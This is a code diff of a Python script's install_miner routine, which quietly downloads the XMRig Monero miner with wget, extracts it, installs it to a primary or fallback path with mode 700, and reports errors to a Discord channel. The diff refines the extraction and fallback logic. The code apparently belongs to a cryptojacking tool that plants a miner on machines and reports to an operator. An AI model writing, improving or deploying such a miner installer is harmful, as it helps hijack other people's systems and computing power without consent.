@@ -51,20 +51,34 @@ def fallback_path():
 def install_miner():
     try:
         fix_path()
-        archive = os.path.join(MAIN_DIR, "xmr.tar.gz")
+        archive = os.path.join(MAIN_DIR, "xmrig.tar.gz")
         url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
         run_cmd(f"wget -qO {archive} {url}")
-        run_cmd(f"tar -xf {archive} -C {MAIN_DIR}")
-        target_path = MINER_BIN if os.access(MAIN_DIR, os.W_OK) else fallback_path()
-        for f in os.listdir(MAIN_DIR):
-            path = os.path.join(MAIN_DIR, f)
-            if "xmrig" in f and os.access(path, os.X_OK):
-                shutil.copy2(path, target_path)
-                os.chmod(target_path, 0o700)
-                return
-        raise FileNotFoundError("No valid miner binary found in archive.")
+        extract_dir = os.path.join(MAIN_DIR, "extract_tmp")
+        os.makedirs(extract_dir, exist_ok=True)
+        run_cmd(f"tar -xf {archive} -C {extract_dir}")
+        # Find miner binary inside extracted dir
+        xmrig_path = ""
+        for root, _, files in os.walk(extract_dir):
+            for f in files:
+                if f == "xmrig":
+                    xmrig_path = os.path.join(root, f)
+                    break
+        if not xmrig_path:
+            raise FileNotFoundError("xmrig binary not found after extraction")
+        # Pick install target
+        target_path = MINER_BIN
+        try:
+            with open(target_path, "wb") as out, open(xmrig_path, "rb") as src:
+                out.write(src.read())
+        except PermissionError:
+            target_path = fallback_path()
+            os.makedirs(os.path.dirname(target_path), exist_ok=True)
+            with open(target_path, "wb") as out, open(xmrig_path, "rb") as src:
+                out.write(src.read())
+        os.chmod(target_path, 0o700)
     except Exception as e:
-        send_discord(f"❌ Install error: {e}")
+        send_discord(f"❌ install_miner FAIL: {e}")
 
 def start_miner():
     try:
